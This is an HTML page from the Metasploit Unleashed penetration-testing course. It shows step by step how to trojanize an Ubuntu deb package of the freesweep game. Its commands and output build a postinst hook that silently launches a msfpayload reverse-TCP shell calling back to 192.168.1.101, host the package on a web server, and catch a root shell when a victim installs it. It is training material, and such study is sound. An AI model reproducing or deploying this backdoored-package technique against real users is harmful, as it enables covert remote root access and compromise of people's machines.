<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Binary Linux Trojans</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Binary
Linux Trojans</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">In order to demonstrate that client
side attacks and trojans are not
exclusive to the Windows world, we will package a Metasploit payload in
with an Ubuntu deb package to give us a shell on Linux.
An excellent video was made by Redmeat_uk demonstrating this technique
that you can view at <a
 href="http://securitytube.net/Ubuntu-Package-Backdoor-using-a-Metasploit-Payload-video.aspx"
 class="external free" rel="nofollow">http://securitytube.net/Ubuntu-Package-Backdoor-using-a-Metasploit-Payload-video.aspx</a>
</p>
<p style="color: rgb(0, 0, 0);">We first need to download the package
that we are going to
infect and move it to a temporary working directory. In our example, we
will use the package 'freesweep', a text-based version of Mine Sweeper.
<br>
<br>
</p>
<pre id="code">root@bt4:/pentest/exploits/framework3# apt-get --download-only install freesweep<br>Reading package lists... Done<br>Building dependency tree<br>Reading state information... Done<br>...snip...<br>root@bt4:/pentest/exploits/framework3# mkdir /tmp/evil<br>root@bt4:/pentest/exploits/framework3# mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil<br>root@bt4:/pentest/exploits/framework3# cd /tmp/evil/<br>root@bt4:/tmp/evil#</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Next, we need to extract the package
to a working directory and
create a DEBIAN directory to hold our additional added "features".
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@v-bt4-pre:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work<br>root@v-bt4-pre:/tmp/evil# mkdir work/DEBIAN</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">In the 'DEBIAN' directory, create a
file named 'control' that contains the following:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/tmp/evil/work/DEBIAN# cat control<br>Package: freesweep<br>Version: 0.90-1<br>Section: Games and Amusement<br>Priority: optional<br>Architecture: i386<br>Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)<br>Description: a text-based minesweeper<br>Freesweep is an implementation of the popular minesweeper game, where<br>one tries to find all the mines without igniting any, based on hints given<br>by the computer. Unlike most implementations of this game, Freesweep<br>works in any visual text display - in Linux console, in an xterm, and in<br>most text-based terminals currently in use.</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We also need to create a
post-installation script that will execute
our binary. In our 'DEBIAN', we'll create a file named 'postinst' that
contains the following:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/tmp/evil/work/DEBIAN# cat postinst<br>#!/bin/sh<br><br>sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now we'll create our malicious
payload. We'll be creating a reverse shell to connect back to us named
'freesweep_scores'.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfpayload linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 X &gt; /tmp/evil/work/usr/games/freesweep_scores<br>Created by msfpayload (http://www.metasploit.com).<br>Payload: linux/x86/shell/reverse_tcp<br>Length: 50<br>Options: LHOST=192.168.1.101,LPORT=443</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We'll now make our post-installation
script executable and build
our new package. The built file will be named 'work.deb' so we will
want to change that to 'freesweep.deb' and copy the package to our web
root directory.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/tmp/evil/work/DEBIAN# chmod 755 postinst<br>root@bt4:/tmp/evil/work/DEBIAN# dpkg-deb --build /tmp/evil/work<br>dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.<br>root@bt4:/tmp/evil# mv work.deb freesweep.deb<br>root@bt4:/tmp/evil# cp freesweep.deb /var/www/</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">If it is not already running, we'll
need to start the Apache web server.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/tmp/evil# /etc/init.d/apache2 start</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">We will need to set up the
Metasploit multi/handler to receive the incoming connection.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfcli exploit/multi/handler PAYLOAD=linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 E<br>[*] Please wait while we load the module tree...<br>[*] Handler binding to LHOST 0.0.0.0<br>[*] Started reverse handler<br>[*] Starting the payload handler...</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">On our Ubuntu victim, we have
somehow convinced the user to download and install our awesome new
game.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">ubuntu@ubuntu:~$ wget http://192.168.1.101/freesweep.deb<br><br>ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">As the victim installs and plays our
game, we have received a shell!
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] Sending stage (36 bytes)<br>[*] Command shell session 1 opened (192.168.1.101:443 -&gt; 192.168.1.175:1129)<br><br>ifconfig<br>eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6<br>inet addr:192.168.1.175 Bcast:192.168.1.255 Mask:255.255.255.0<br>UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1<br>RX packets:49 errors:0 dropped:0 overruns:0 frame:0<br>TX packets:51 errors:0 dropped:0 overruns:0 carrier:0<br>collisions:0 txqueuelen:1000<br>RX bytes:43230 (42.2 KiB) TX bytes:4603 (4.4 KiB)<br>Interrupt:17 Base address:0x1400<br>...snip...<br><br>hostname<br>ubuntu<br>id<br>uid=0(root) gid=0(root) groups=0(root)</pre>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Client_Side_Exploits"
 title="Client Side Exploits">Client-Side Exploits</a></div>
</body>
</html>
